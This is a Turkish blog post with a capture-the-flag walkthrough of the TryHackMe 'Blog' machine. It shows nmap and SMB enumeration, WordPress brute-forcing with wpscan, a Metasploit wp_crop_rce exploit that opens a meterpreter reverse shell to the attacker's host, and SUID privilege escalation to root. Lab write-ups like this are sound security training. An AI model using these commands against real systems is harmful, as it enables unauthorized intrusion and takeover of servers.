---
title: "Blog Makine Çözümü"
date: "2025-03-22"
tags: ["ctf", "tryhackme"]
---

Merhabalar, bu yazımda sizlere TryHackMe platformunda bulunan “Blog” isimli makinenin çözümü anlatacağım. Keyifli Okumalar…

1 - Nmap aracını kullanarak makine üzerindeki açık portlar ve servisler hakkında detaylı bilgi ediniyorum.

```system
┌──(root㉿kali)-[/home/kali/Downloads]
└─# nmap -sS -sV 10.10.58.35                    
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-14 07:49 EDT
Nmap scan report for 10.10.58.35
Host is up (0.083s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2 - SMB servisinde paylaşılan klasörleri listeliyorum. "BillySMB" klasörüne girip dosyaları indiriyorum.

```system
┌──(root㉿kali)-[/home/kali/Downloads]
└─# smbclient -L //10.10.58.35                           
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BLOG

┌──(root㉿kali)-[/home/kali/Downloads]
└─# smbclient //10.10.58.35/BillySMB 
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020

                15413192 blocks of size 1024. 9788764 blocks available
smb: \> mget *
Get file Alice-White-Rabbit.jpg? y
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (80.1 KiloBytes/sec) (average 80.1 KiloBytes/sec)
Get file tswift.mp4? y
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (1307.1 KiloBytes/sec) (average 931.9 KiloBytes/sec)
Get file check-this.png? y
getting file \check-this.png of size 3082 as check-this.png (11.2 KiloBytes/sec) (average 777.6 KiloBytes/sec)
smb: \> exit
```

3 - HTTP sayfasının kaynağını incelediğimde "blog.thm" alan adını görüyorum. Alan adını "/etc/hosts" dosyasına ekliyorum.

```system
<link rel='dns-prefetch' href='[//blog.thm](view-source:http://blog.thm/)' />

┌──(root㉿kali)-[/home/kali/Downloads]
└─# echo "10.10.58.35 blog.thm" | tee -a /etc/hosts
10.10.58.35 blog.thm
```

4 - Wpscan, aracı ile wordpress kullanıcılarını tarıyorum. Daha sonra bulduğum kullanıcıların üzerinde "rockyou.txt" kullanarak parola saldırısı gerçekleştiriyorum.

```system
┌──(root㉿kali)-[/home/kali/Downloads]
└─# wpscan --url http://blog.thm/ -e u
*
*
┌──(root㉿kali)-[/home/kali/Downloads]
└─# wpscan --url http://blog.thm/ --usernames usernames.txt --passwords /usr/share/wordlists/rockyou.txt
```

5 - Metasploit-framework içerisindeki "exploit/multi/http/wp_crop_rce" modülünü kullanarak bir shell alıyorum.

```
msf6 > use exploit/multi/http/wp_crop_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_crop_rce) > show options
*
*
msf6 exploit(multi/http/wp_crop_rce) > run

[*] Started reverse TCP handler on 10.8.94.51:4444 
[*] Authenticating with WordPress using *CENSORED*:*CENSORED*...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.58.35
[*] Meterpreter session 1 opened (10.8.94.51:4444 -> 10.10.58.35:54236) at 2023-06-14 08:15:32 -0400
[*] Attempting to clean up files...

meterpreter > 
```

6 - SUID biti aktifleştirilmiş komutları listelediğimde "/usr/sbin/checker" komutu görüyorum. 

```system
meterpreter > shell
Process 1751 created.
Channel 2 created.
SHELL=/bin/bash script -q /dev/null
www-data@blog:/var/www/wordpress$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
*
*
/usr/sbin/checker
```

7 - "/usr/sbin/checker" komutu çalıştırdığımda admin olmadığımı söyleyen bir mesajla karşılaşıyorum. "ltrace" komutu ile incelediğimde çevre birimlerinde "admin" isminde bir değişken aradığını görüyorum. "admin=1" değerinde bir değişken yaratıp tekrar çalıştırdığımda root kullanıcısına geçtiğimi görüyorum.

```system
www-data@blog:/var/www/wordpress$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin
www-data@blog:/var/www/wordpress$ ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
www-data@blog:/var/www/wordpress$ export admin=1
export admin=1
www-data@blog:/var/www/wordpress$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/var/www/wordpress#
```

8 - Root kullanıcısı ile bayrakları elde ediyorum.

```system
root@blog:/var/www/wordpress# cd /root
cd /root
root@blog:/root# ls
ls
root.txt
root@blog:/root# cat root.txt
cat root.txt
*CENSORED*
root@blog:/root# cd /home
cd /home
root@blog:/home# ls
ls
bjoel
root@blog:/home# cd bjoel
cd bjoel
root@blog:/home/bjoel# ls
ls
Billy_Joel_Termination_May20-2020.pdf  user.txt
root@blog:/home/bjoel# cat user.txt
cat user.txt
You won't find what you're looking for here.

TRY HARDER
root@blog:/home/bjoel# find / -type f -name "user.txt" 2>/dev/null
find / -type f -name "user.txt" 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
root@blog:/home/bjoel# cat /media/usb/user.txt
cat /media/usb/user.txt
*CENSORED*
```